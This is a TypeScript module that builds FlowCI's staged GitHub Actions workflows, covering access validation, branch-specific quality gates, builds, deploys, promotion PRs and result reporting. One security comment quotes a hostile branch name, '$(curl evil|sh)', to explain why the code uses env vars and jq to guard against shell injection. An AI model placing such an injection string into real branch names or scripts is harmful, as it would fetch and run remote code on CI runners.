import yaml from 'js-yaml';

import type { WorkflowTemplate } from '../catalog/catalog.service';
import type {
  DeploymentWorkflowTarget,
  GenerateWorkflowDto,
} from './dto/generate-workflow.dto';

export type WorkflowStage = 'access' | 'quality' | 'package';

export interface StagedWorkflowFile {
  stage: WorkflowStage;
  name: string;
  path: string;
  gated: boolean;
  yaml: string;
}

export interface WorkflowFileMetadata {
  stage: WorkflowStage;
  name: string;
  path: string;
  gated: boolean;
}

export interface StagedWorkflowBundle {
  workflowFiles: StagedWorkflowFile[];
  metadata: WorkflowFileMetadata[];
}

const CENTRAL_WORKFLOW_REF =
  'cicd-external-project/cicd-workflow/.github/workflows';

const PLATFORM_BASE_URL = 'https://flowci-be-test.onrender.com';

const CI_VALIDATE_URL = `${PLATFORM_BASE_URL}/api/v1/ci/validate`;

export const CI_REPORT_URL = `${PLATFORM_BASE_URL}/api/v1/ci/report`;

/**
 * Branch promotion model enforced by the generated pipelines:
 *
 *   test → full quality suite at the baseline thresholds (tests, lint,
 *          security, Sonar analysis). CI-only: no deployments except the
 *          Render `test` environment for backends.
 *   uat  → the same suite under a stricter governance policy: higher
 *          coverage threshold, lint warnings fail the build, and the
 *          SonarCloud quality gate is blocking. Vercel deploys are
 *          *preview* only.
 *   main → production. A production-readiness gate (GitHub `production`
 *          environment — honours required reviewers when configured) must
 *          pass before any deployment, and deploys target the production
 *          environment on the provider.
 *
 * Quality/package stages are `workflow_run`-triggered, which always executes
 * in the default-branch context, so every branch decision below must use the
 * originating branch instead of `github.ref_name` alone.
 */
const BRANCH_EXPR = 'github.event.workflow_run.head_branch || github.ref_name';

const PROTECTED_DEPLOY_BRANCHES = ['test', 'uat', 'main'] as const;

const PROTECTED_DEPLOY_BRANCHES_JSON = JSON.stringify(
  PROTECTED_DEPLOY_BRANCHES,
);

const HEAD_SHA_EXPR = '${{ github.event.workflow_run.head_sha || github.sha }}';

/** Extra coverage demanded on uat/main on top of the baseline, capped. */
const STRICT_COVERAGE_BONUS = 10;
const STRICT_COVERAGE_CAP = 95;

export interface StagedWorkflowOptions extends GenerateWorkflowDto {
  /**
   * Distinguishes co-located pipelines in a single repository (microservices
   * shape). When set, every workflow file path and workflow `name:` is
   * suffixed so the backend and frontend chains do not overwrite each other —
   * GitHub Actions resolves `workflow_run` triggers by workflow name, so the
   * names must be unique per slot for the stage chains to stay independent.
   */
  workflowVariant?: 'backend' | 'frontend';
  centralWorkflowRef?: string;
}

export function buildStagedWorkflowBundle(
  template: WorkflowTemplate,
  dto: StagedWorkflowOptions,
): StagedWorkflowBundle {
  const serviceName = dto.serviceName;
  const servicePath = normalizeServicePath(dto.servicePath);
  const nodeVersion = dto.nodeVersion ?? '24';
  const coverageThreshold = dto.coverageThreshold ?? 80;
  const strictCoverageThreshold = Math.min(
    coverageThreshold + STRICT_COVERAGE_BONUS,
    STRICT_COVERAGE_CAP,
  );
  const deploymentProvider = dto.deploymentProvider;
  const deploymentTargets = dto.deploymentTargets ?? [];
  const centralWorkflowRef = dto.centralWorkflowRef ?? 'v1';
  const requireProductionApproval =
    dto.enhancements?.includes('strictProductionApproval') ?? false;
  const stack = template.stack;
  const isBackend = stack === 'nestjs' || stack === 'nodejs';
  const testWorkflow = isBackend ? 'backend-tests.yml' : 'frontend-tests.yml';
  const testJobId = isBackend ? 'backend-tests' : 'frontend-tests';
  // The central test workflows enforce coverage by parsing
  // coverage/coverage-summary.json, and SonarCloud ingests lcov, so the
  // command must produce both reporters.
  const testCommand = isBackend
    ? 'npm test -- --coverage --coverageReporters=json-summary --coverageReporters=lcov --json --outputFile=test-results.json'
    : 'npm run test -- --coverage --coverageReporters=json-summary --coverageReporters=lcov --json --outputFile=test-results.json';
  const lintCommand = 'npm run lint';

  const fileSuffix = dto.workflowVariant ? `-${dto.workflowVariant}` : '';
  const nameSuffix = dto.workflowVariant ? ` (${dto.workflowVariant})` : '';
  const accessName = `FlowCI Access Gate${nameSuffix}`;
  const qualityName = `FlowCI Quality${nameSuffix}`;
  const packageName = `FlowCI Package${nameSuffix}`;

  // Promotion PRs wait on every deploy job configured for the repo; skipped
  // deploys are acceptable (e.g. Vercel jobs skip on the test branch).
  const renderImageTargets = deploymentTargets.filter(
    (target) =>
      target.provider === 'render' &&
      target.deploymentStrategy === 'render_image_pushed',
  );
  const deployJobIds = [
    ...deploymentTargets
      .filter((target) => target.provider === 'vercel')
      .map((target) => `deploy-vercel-${target.slot}`),
    ...(renderImageTargets.length > 0
      ? renderImageTargets.map((target) => `deploy-render-${target.slot}`)
      : deploymentProvider === 'render'
        ? ['deploy-render']
        : []),
  ];

  const files: StagedWorkflowFile[] = [
    {
      stage: 'access',
      name: accessName,
      path: `.github/workflows/00-flowci-access${fileSuffix}.yml`,
      gated: true,
      yaml: dumpWorkflow({
        name: accessName,
        on: {
          push: { branches: ['test', 'uat', 'main'] },
          pull_request: { branches: ['test', 'uat', 'main'] },
          workflow_dispatch: {},
        },
        permissions: { contents: 'read' },
        env: {
          CI_VALIDATE_URL,
          CI_REPORT_URL: '${{ secrets.CI_REPORT_URL }}',
        },
        jobs: {
          'validate-access': validationJob('access'),
          'report-results': reportingJob('access', ['validate-access']),
        },
      }),
    },
    {
      stage: 'quality',
      name: qualityName,
      path: `.github/workflows/10-flowci-quality${fileSuffix}.yml`,
      gated: true,
      yaml: dumpWorkflow({
        name: qualityName,
        on: {
          workflow_run: {
            workflows: [accessName],
            types: ['completed'],
          },
          workflow_dispatch: {},
        },
        permissions: {
          contents: 'read',
          'security-events': 'write',
        },
        env: {
          CI_VALIDATE_URL,
          CI_REPORT_URL: '${{ secrets.CI_REPORT_URL }}',
        },
        jobs: {
          'validate-access': {
            if: "${{ github.event_name == 'workflow_dispatch' || github.event.workflow_run.conclusion == 'success' }}",
            ...validationJob('quality'),
          },
          'branch-policy': branchPolicyJob(
            coverageThreshold,
            strictCoverageThreshold,
          ),
          [testJobId]: {
            needs: ['branch-policy'],
            uses: `${CENTRAL_WORKFLOW_REF}/${testWorkflow}@${centralWorkflowRef}`,
            with: {
              'working-directory': servicePath,
              'system-name': serviceName,
              ...(isBackend
                ? { 'backend-stack': stack }
                : // Scaffolded repos keep their specs in src/, not the
                  // frontend-tests default of tests/unit.
                  { 'unit-tests-directory': 'src' }),
              'node-version': Number(nodeVersion),
              'coverage-threshold':
                '${{ fromJson(needs.branch-policy.outputs.coverage-threshold) }}',
              'enforce-coverage': true,
              'test-command': testCommand,
              'checkout-ref': HEAD_SHA_EXPR,
            },
          },
          lint: {
            needs: ['branch-policy'],
            uses: `${CENTRAL_WORKFLOW_REF}/lint-check.yml@${centralWorkflowRef}`,
            with: {
              'working-directory': servicePath,
              'system-name': serviceName,
              'node-version': Number(nodeVersion),
              'lint-command': lintCommand,
              // Lint warnings are tolerated on test, fatal on uat/main.
              'fail-on-warning':
                '${{ fromJson(needs.branch-policy.outputs.fail-on-warning) }}',
              'checkout-ref': HEAD_SHA_EXPR,
            },
          },
          security: {
            needs: ['validate-access'],
            uses: `${CENTRAL_WORKFLOW_REF}/security-scan.yml@${centralWorkflowRef}`,
            with: {
              'working-directory': servicePath,
              'system-name': serviceName,
              'node-version': Number(nodeVersion),
              'fail-on-high': true,
              'checkout-ref': HEAD_SHA_EXPR,
            },
          },
          sonar: {
            needs: ['branch-policy', testJobId],
            // Runs only when the FlowCI-provisioned SonarCloud secrets are
            // present so repos without Sonar keep passing. The quality gate
            // is advisory on test and blocking on uat/main (branch-policy
            // decides via sonar-gate-wait).
            if: "${{ needs.branch-policy.outputs.sonar-enabled == 'true' }}",
            uses: `${CENTRAL_WORKFLOW_REF}/sonarcloud-scan.yml@${centralWorkflowRef}`,
            with: {
              'working-directory': servicePath,
              'system-name': serviceName,
              'sources-path': 'src',
              'tests-path': 'src',
              'coverage-report-path': 'coverage/lcov.info',
              'coverage-artifact-name': `${serviceName}-coverage`,
              'quality-gate-wait':
                '${{ fromJson(needs.branch-policy.outputs.sonar-gate-wait) }}',
              'checkout-ref': HEAD_SHA_EXPR,
            },
            secrets: {
              SONAR_TOKEN: '${{ secrets.SONAR_TOKEN }}',
              SONAR_PROJECT_KEY: '${{ secrets.SONAR_PROJECT_KEY }}',
              SONAR_ORGANIZATION: '${{ secrets.SONAR_ORGANIZATION }}',
            },
          },
          'report-results': reportingJob(
            'quality',
            [
              'validate-access',
              'branch-policy',
              testJobId,
              'lint',
              'security',
              'sonar',
            ],
            { testJobId },
          ),
        },
      }),
    },
    {
      stage: 'package',
      name: packageName,
      path: `.github/workflows/20-flowci-package${fileSuffix}.yml`,
      gated: true,
      yaml: dumpWorkflow({
        name: packageName,
        on: {
          workflow_run: {
            workflows: [qualityName],
            types: ['completed'],
          },
          workflow_dispatch: {},
        },
        permissions: {
          contents: 'read',
          packages: 'write',
        },
        env: {
          CI_VALIDATE_URL,
          CI_REPORT_URL: '${{ secrets.CI_REPORT_URL }}',
        },
        jobs: {
          'validate-access': {
            if: "${{ github.event_name == 'workflow_dispatch' || github.event.workflow_run.conclusion == 'success' }}",
            ...validationJob('package'),
          },
          build: buildJob(servicePath, nodeVersion),
          'production-gate': productionGateJob(
            serviceName,
            isBackend,
            requireProductionApproval,
            centralWorkflowRef,
          ),
          ...vercelDeployJobs(
            serviceName,
            servicePath,
            deploymentTargets,
            centralWorkflowRef,
          ),
          ...(renderImageTargets.length > 0
            ? renderDeployJobs(
                serviceName,
                servicePath,
                renderImageTargets,
                centralWorkflowRef,
              )
            : deploymentProvider === 'render'
              ? {
                  'deploy-render': renderDeployJob(
                    serviceName,
                    centralWorkflowRef,
                  ),
                }
              : {}),
          'promote-to-uat': promotionJob(
            'test-to-uat',
            'test',
            serviceName,
            deployJobIds,
            centralWorkflowRef,
          ),
          'promote-to-main': promotionJob(
            'uat-to-main',
            'uat',
            serviceName,
            deployJobIds,
            centralWorkflowRef,
          ),
          'report-results': reportingJob('package', [
            'validate-access',
            'build',
          ]),
        },
      }),
    },
  ];

  return {
    workflowFiles: files,
    metadata: files.map((file) => ({
      stage: file.stage,
      name: file.name,
      path: file.path,
      gated: file.gated,
    })),
  };
}

/**
 * Normalize a user-supplied service path for use as a workflow
 * working-directory: trims trailing slashes (the FE sends "backend/") and
 * falls back to the repository root.
 */
function normalizeServicePath(servicePath: string | undefined): string {
  const trimmed = (servicePath ?? '.').trim().replace(/\/+$/, '');
  return trimmed === '' ? '.' : trimmed;
}

function validationJob(stage: WorkflowStage) {
  return {
    runs_on: 'ubuntu-latest',
    steps: [
      {
        name: 'Validate FlowCI access',
        run: [
          'RESPONSE=$(curl -sf -w "\\n%{http_code}" \\',
          '  -X POST \\',
          '  -H "Authorization: Bearer ${{ secrets.CI_TOKEN }}" \\',
          '  -H "Content-Type: application/json" \\',
          '  -d "{\\"repo\\":\\"${{ github.repository }}\\",\\"stage\\":\\"' +
            stage +
            '\\",\\"workflowRunId\\":\\"${{ github.run_id }}\\",\\"headSha\\":\\"${{ github.event.workflow_run.head_sha || github.sha }}\\"}" \\',
          '  "$CI_VALIDATE_URL") || true',
          'HTTP_CODE=$(printf \'%s\' "$RESPONSE" | tail -1)',
          'BODY=$(printf \'%s\' "$RESPONSE" | head -n -1)',
          'if [ "$HTTP_CODE" != "200" ]; then',
          '  echo "::error::FlowCI authorization failed (HTTP $HTTP_CODE). ${BODY}"',
          '  exit 1',
          'fi',
          'echo "FlowCI authorization validated."',
        ].join('\n'),
      },
    ],
  };
}

/**
 * Resolves the per-branch governance policy once so every downstream job
 * consumes the same decision. Feature branches and `test` get the baseline;
 * `uat` and `main` get the strict profile. Sonar participation is detected
 * from secret presence (job-level `if` cannot read the secrets context).
 */
function branchPolicyJob(baseCoverage: number, strictCoverage: number) {
  return {
    needs: ['validate-access'],
    runs_on: 'ubuntu-latest',
    outputs: {
      branch: '${{ steps.resolve.outputs.branch }}',
      'coverage-threshold': '${{ steps.resolve.outputs.coverage-threshold }}',
      'fail-on-warning': '${{ steps.resolve.outputs.fail-on-warning }}',
      'sonar-enabled': '${{ steps.resolve.outputs.sonar-enabled }}',
      'sonar-gate-wait': '${{ steps.resolve.outputs.sonar-gate-wait }}',
    },
    steps: [
      {
        name: 'Resolve branch policy',
        id: 'resolve',
        env: {
          SONAR_CONFIGURED:
            "${{ secrets.SONAR_TOKEN != '' && secrets.SONAR_ORGANIZATION != '' && secrets.SONAR_PROJECT_KEY != '' }}",
        },
        run: [
          `BRANCH="\${{ ${BRANCH_EXPR} }}"`,
          'if [ "$BRANCH" = "uat" ] || [ "$BRANCH" = "main" ]; then',
          `  COVERAGE_THRESHOLD=${strictCoverage}`,
          '  FAIL_ON_WARNING=true',
          '  SONAR_GATE_WAIT=true',
          'else',
          `  COVERAGE_THRESHOLD=${baseCoverage}`,
          '  FAIL_ON_WARNING=false',
          '  SONAR_GATE_WAIT=false',
          'fi',
          '{',
          '  echo "branch=$BRANCH"',
          '  echo "coverage-threshold=$COVERAGE_THRESHOLD"',
          '  echo "fail-on-warning=$FAIL_ON_WARNING"',
          '  echo "sonar-enabled=$SONAR_CONFIGURED"',
          '  echo "sonar-gate-wait=$SONAR_GATE_WAIT"',
          '} >> "$GITHUB_OUTPUT"',
          'echo "Branch policy: branch=$BRANCH coverage>=$COVERAGE_THRESHOLD failOnWarning=$FAIL_ON_WARNING sonar=$SONAR_CONFIGURED gateWait=$SONAR_GATE_WAIT"',
        ].join('\n'),
      },
    ],
  };
}

function protectedDeployBranchExpression(): string {
  return [
    '${{',
    '(',
    "github.event_name == 'workflow_dispatch' &&",
    `contains(fromJson('${PROTECTED_DEPLOY_BRANCHES_JSON}'), github.ref_name)`,
    ') || (',
    "github.event_name == 'workflow_run' &&",
    "github.event.workflow_run.conclusion == 'success' &&",
    `contains(fromJson('${PROTECTED_DEPLOY_BRANCHES_JSON}'), github.event.workflow_run.head_branch)`,
    ')',
    '}}',
  ].join(' ');
}

function buildJob(servicePath: string, nodeVersion: string) {
  return {
    needs: ['validate-access'],
    if: `\${{ (${BRANCH_EXPR}) == 'test' || (${BRANCH_EXPR}) == 'uat' || (${BRANCH_EXPR}) == 'main' }}`,
    runs_on: 'ubuntu-latest',
    defaults: {
      run: {
        'working-directory': `./${servicePath}`,
      },
    },
    steps: [
      {
        uses: 'actions/checkout@v6',
        with: {
          ref: '${{ github.event.workflow_run.head_sha || github.sha }}',
        },
      },
      {
        uses: 'actions/setup-node@v6',
        with: {
          'node-version': Number(nodeVersion),
        },
      },
      {
        name: 'Install dependencies',
        // Fresh FlowCI scaffolds have no package-lock.json yet (the customer
        // generates it on first `npm install`), so npm ci would hard-fail.
        run: 'if [ -f package-lock.json ]; then npm ci --ignore-scripts; else npm install --ignore-scripts; fi',
      },
      { run: 'npm run build' },
    ],
  };
}

/**
 * Production-readiness gate, main branch only. Routes through the GitHub
 * `production` environment so required reviewers (when the customer
 * configures them) block the deploy; the checklist + audit trail run either
 * way.
 */
function productionGateJob(
  serviceName: string,
  isBackend: boolean,
  requireApproval: boolean,
  centralWorkflowRef: string,
) {
  return {
    needs: ['build'],
    if: `\${{ (${BRANCH_EXPR}) == 'main' }}`,
    uses: `${CENTRAL_WORKFLOW_REF}/production-gate.yml@${centralWorkflowRef}`,
    with: {
      'system-dir': serviceName,
      'app-type': isBackend ? 'api' : 'web',
      'require-approval': requireApproval,
    },
  };
}

/**
 * Vercel deployments follow the promotion model: nothing on test (CI-only),
 * previews on uat, production on main — and main additionally requires the
 * production gate to have passed. `!cancelled()` keeps the `if` evaluated
 * when production-gate is skipped (every branch except main).
 */
function vercelDeployJobs(
  serviceName: string,
  servicePath: string,
  targets: DeploymentWorkflowTarget[],
  centralWorkflowRef: string,
) {
  return Object.fromEntries(
    targets
      .filter((target) => target.provider === 'vercel')
      .map((target) => {
        const secretNames = target.secretNames ?? {};
        return [
          `deploy-vercel-${target.slot}`,
          {
            needs: ['build', 'production-gate'],
            if: `\${{ !cancelled() && needs.build.result == 'success' && ((${BRANCH_EXPR}) == 'test' || (${BRANCH_EXPR}) == 'uat' || ((${BRANCH_EXPR}) == 'main' && needs.production-gate.result == 'success')) }}`,
            uses: `${CENTRAL_WORKFLOW_REF}/vercel-deploy.yml@${centralWorkflowRef}`,
            with: {
              'system-name':
                target.slot === 'standalone' ? serviceName : target.slot,
              'working-directory': target.rootDirectory ?? servicePath,
              'checkout-ref': HEAD_SHA_EXPR,
              'source-branch': `\${{ ${BRANCH_EXPR} }}`,
              environment: `\${{ (${BRANCH_EXPR}) == 'main' && 'production' || 'preview' }}`,
            },
            secrets: {
              VERCEL_TOKEN: `\${{ secrets.${secretNames.token} }}`,
              VERCEL_ORG_ID: `\${{ secrets.${secretNames.orgId} }}`,
              VERCEL_PROJECT_ID: `\${{ secrets.${secretNames.projectId} }}`,
            },
          },
        ];
      }),
  );
}

/**
 * Render deployments map branches to provider environments (test → test,
 * uat → uat, main → production); the production environment is reachable
 * only after the production gate passes.
 */
function renderDeployJob(serviceName: string, centralWorkflowRef: string) {
  return {
    needs: ['build', 'production-gate'],
    if: `\${{ !cancelled() && needs.build.result == 'success' && ((${BRANCH_EXPR}) == 'test' || (${BRANCH_EXPR}) == 'uat' || ((${BRANCH_EXPR}) == 'main' && needs.production-gate.result == 'success')) }}`,
    uses: `${CENTRAL_WORKFLOW_REF}/render-deploy.yml@${centralWorkflowRef}`,
    with: {
      'system-name': serviceName,
      environment: `\${{ (${BRANCH_EXPR}) == 'main' && 'production' || (${BRANCH_EXPR}) }}`,
      branch: `\${{ ${BRANCH_EXPR} }}`,
    },
    secrets: 'inherit',
  };
}

/**
 * Auto-promotion PR after a fully green package stage on a promotion source
 * branch: test → uat once everything passed on test, uat → main once
 * everything passed on uat. The package stage only starts after the quality
 * stage concluded successfully, so a created PR implies tests, lint,
 * security, and Sonar all passed under that branch's policy.
 *
 * `promotion.yml` updates the existing open PR instead of stacking
 * duplicates, and skips when the source branch has no commits ahead of the
 * target. Uses GH_PR_TOKEN (a PAT) when provisioned so the PR triggers the
 * access-gate `pull_request` checks; falls back to github.token, which still
 * creates the PR but GitHub suppresses workflow triggers for it.
 */
function promotionJob(
  direction: 'test-to-uat' | 'uat-to-main',
  sourceBranch: 'test' | 'uat',
  serviceName: string,
  deployJobIds: string[],
  centralWorkflowRef: string,
) {
  const conditions = [
    '!cancelled()',
    `(${BRANCH_EXPR}) == '${sourceBranch}'`,
    "needs.build.result == 'success'",
    ...deployJobIds.map(
      (id) =>
        `(needs.${id}.result == 'success' || needs.${id}.result == 'skipped')`,
    ),
  ];

  return {
    permissions: {
      contents: 'read',
      'pull-requests': 'write',
    },
    needs: ['build', ...deployJobIds],
    if: `\${{ ${conditions.join(' && ')} }}`,
    uses: `${CENTRAL_WORKFLOW_REF}/promotion.yml@${centralWorkflowRef}`,
    with: {
      'pipeline-kind': 'single',
      direction,
      'system1-name': serviceName,
      'pipeline-result': 'success',
    },
    secrets: {
      PR_TOKEN:
        "${{ secrets.GH_PR_TOKEN != '' && secrets.GH_PR_TOKEN || github.token }}",
    },
  };
}

function renderDeployJobs(
  serviceName: string,
  servicePath: string,
  targets: DeploymentWorkflowTarget[],
  centralWorkflowRef: string,
) {
  return Object.fromEntries(
    targets
      .filter(
        (target) =>
          target.provider === 'render' &&
          target.deploymentStrategy === 'render_image_pushed',
      )
      .map((target) => {
        const secretNames = target.secretNames ?? {};
        const secretPrefix = `RENDER_${target.slot.toUpperCase()}`;
        return [
          `deploy-render-${target.slot}`,
          {
            needs: ['build', 'production-gate'],
            if: `\${{ !cancelled() && needs.build.result == 'success' && ((${BRANCH_EXPR}) == 'test' || (${BRANCH_EXPR}) == 'uat' || ((${BRANCH_EXPR}) == 'main' && needs.production-gate.result == 'success')) }}`,
            uses: `${CENTRAL_WORKFLOW_REF}/render-deploy.yml@${centralWorkflowRef}`,
            with: {
              'system-name':
                target.slot === 'standalone' ? serviceName : target.slot,
              environment: `\${{ (${BRANCH_EXPR}) == 'main' && 'production' || (${BRANCH_EXPR}) }}`,
              branch: `\${{ ${BRANCH_EXPR} }}`,
              'working-directory': target.rootDirectory ?? servicePath,
              'docker-context':
                target.dockerContext ?? target.rootDirectory ?? servicePath,
              'dockerfile-path': target.dockerfilePath ?? 'Dockerfile',
              'image-name': target.imageName ?? `flowci-${target.slot}`,
              'checkout-ref': HEAD_SHA_EXPR,
            },
            secrets: {
              RENDER_API_KEY: `\${{ secrets.${secretNames.apiKey ?? `${secretPrefix}_API_KEY`} }}`,
              RENDER_SERVICE_ID: `\${{ secrets.${secretNames.serviceId ?? `${secretPrefix}_SERVICE_ID`} }}`,
              RENDER_OWNER_ID: `\${{ secrets.${secretNames.ownerId ?? `${secretPrefix}_OWNER_ID`} }}`,
              RENDER_REGISTRY_CREDENTIAL_ID: `\${{ secrets.${secretNames.registryCredentialId ?? `${secretPrefix}_REGISTRY_CREDENTIAL_ID`} }}`,
            },
          },
        ];
      }),
  );
}

/**
 * Best-effort reporting step that POSTs structured pipeline results to the
 * FlowCI platform after each stage. Runs with `if: always()` so it fires on
 * success, failure, and cancellation. The curl uses `--max-time 5` and falls
 * back to a warning annotation on any error so the pipeline never fails due to
 * a reporting outage.
 *
 * Security: all GitHub context values (`github.repository`, `github.run_id`,
 * branch names, SHAs) are mapped to shell env vars in the step `env:` block
 * and referenced only as double-quoted shell variables inside the `run:` script.
 * JSON is assembled with `jq --arg` / `--argjson` so hostile branch names
 * (e.g. `$(curl evil|sh)`) cannot escape the string boundary.
 *
 * The quality stage populates `results.coverage` from the upstream test job's
 * `coverage-percent` output and the branch-policy `coverage-threshold` output.
 * Both are passed via env vars and validated as numeric before inclusion so an
 * absent or "unknown" value never corrupts the payload. All other stages send
 * an empty `results: {}`.
 *
 * Stage conclusion is derived from the upstream `needs.*.result` context (not
 * `job.status`, which only reflects this reporting job's own outcome).
 */
function reportingJob(
  stage: WorkflowStage,
  needs: string[],
  opts?: { testJobId?: string },
) {
  const isQuality = stage === 'quality';
  const testJobId = opts?.testJobId;

  // env vars injected into the step — NO ${{ }} inside the run: script
  const stepEnv: Record<string, string> = {
    CI_TOKEN: '${{ secrets.CI_TOKEN }}',
    CI_REPORT_URL: '${{ secrets.CI_REPORT_URL }}',
    GH_REPO: '${{ github.repository }}',
    GH_BRANCH: `\${{ ${BRANCH_EXPR} }}`,
    GH_SHA: HEAD_SHA_EXPR,
    GH_RUN_ID: '${{ github.run_id }}',
    STAGE_FAILED: "${{ contains(needs.*.result, 'failure') }}",
    STAGE_CANCELLED: "${{ contains(needs.*.result, 'cancelled') }}",
  };

  if (isQuality && testJobId) {
    stepEnv['COVERAGE_PCT'] =
      `\${{ needs.${testJobId}.outputs.coverage-percent }}`;
    stepEnv['COVERAGE_THRESHOLD'] =
      '${{ needs.branch-policy.outputs.coverage-threshold }}';
  }

  const scriptLines = [
    '# Derive stage conclusion from upstream needs results',
    'if [ "$STAGE_FAILED" = "true" ]; then',
    '  CONCLUSION="failure"',
    'elif [ "$STAGE_CANCELLED" = "true" ]; then',
    '  CONCLUSION="cancelled"',
    'else',
    '  CONCLUSION="success"',
    'fi',
    '',
    '# Build results sub-object (quality stage only — reads from job outputs)',
    'RESULTS="{}"',
    ...(isQuality && testJobId
      ? [
          '',
          '# Include coverage only when COVERAGE_PCT is a real number',
          '# (central workflows emit "unknown" when coverage is not available)',
          'if echo "$COVERAGE_PCT" | grep -qE \'^[0-9]+([.][0-9]+)?$\'; then',
          '  RESULTS=$(jq -n \\',
          '    --argjson pct "$COVERAGE_PCT" \\',
          '    --argjson threshold "${COVERAGE_THRESHOLD:-0}" \\',
          '    \'{"coverage":{"pct":$pct,"threshold":$threshold}}\')',
          'fi',
        ]
      : []),
    '',
    '# Build and POST the payload with jq — no string interpolation of context values',
    'PAYLOAD=$(jq -n \\',
    '  --arg repo     "$GH_REPO" \\',
    '  --arg branch   "$GH_BRANCH" \\',
    '  --arg sha      "$GH_SHA" \\',
    '  --argjson runId "$GH_RUN_ID" \\',
    `  --arg stage    "${stage}" \\`,
    '  --arg conclusion "$CONCLUSION" \\',
    '  --argjson results "$RESULTS" \\',
    "  '{repoFullName:$repo,branch:$branch,commitSha:$sha,runId:$runId,stage:$stage,conclusion:$conclusion,results:$results}')",
    'curl -sf --max-time 5 \\',
    '  -X POST "$CI_REPORT_URL" \\',
    '  -H "Authorization: Bearer $CI_TOKEN" \\',
    '  -H "Content-Type: application/json" \\',
    '  -d "$PAYLOAD" \\',
    '  || echo "::warning::Failed to report pipeline results to FlowCI"',
  ];

  return {
    if: '${{ always() }}',
    needs,
    runs_on: 'ubuntu-latest',
    env: {
      CI_TOKEN: '${{ secrets.CI_TOKEN }}',
      CI_REPORT_URL: '${{ secrets.CI_REPORT_URL }}',
    },
    steps: [
      {
        name: 'Report stage results to FlowCI',
        env: stepEnv,
        run: scriptLines.join('\n'),
      },
    ],
  };
}

function dumpWorkflow(workflow: Record<string, unknown>): string {
  return yaml
    .dump(workflow, {
      lineWidth: -1,
      noRefs: true,
      sortKeys: false,
    })
    .replaceAll('runs_on:', 'runs-on:');
}
